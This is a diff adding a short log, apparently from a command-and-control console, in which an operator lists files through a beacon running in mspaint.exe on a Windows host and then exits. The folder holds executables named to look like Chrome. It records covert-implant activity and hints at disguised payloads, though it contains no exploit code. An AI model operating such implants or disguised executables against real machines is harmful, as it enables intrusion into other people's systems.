@@ -1,0 +1,18 @@
+12/15 14:48:40 UTC [metadata] 192.168.1.12 <- 192.168.1.12; computer: DESKTOP-DVHN6TG; user: david; process: mspaint.exe; pid: 3408; os: Windows; version: 10.0; build: 19044; beacon arch: x64 (x64)
+12/15 14:48:43 UTC [input] <neo> ls
+12/15 14:48:43 UTC [task] <> Tasked beacon to list files in .
+12/15 14:49:38 UTC [checkin] host called home, sent: 19 bytes
+12/15 14:49:38 UTC [output]
+F:\testcap\*
+D	0	12/15/2022 21:22:24	.
+D	0	12/15/2022 21:22:24	..
+F	631910	12/15/2022 15:29:52	chrome.exe
+F	111088	12/15/2022 15:28:24	chrome.ico
+F	631877	12/15/2022 20:44:22	chrome0.exe
+F	631913	12/15/2022 16:14:30	chrome1.exe
+F	2247	12/15/2022 15:25:32	Google Chrome.lnk
+F	927232	12/15/2022 20:43:10	a.exe
+
+
+12/15 14:49:57 UTC [input] <neo> exit
+12/15 14:49:57 UTC [task] <> Tasked beacon to exit
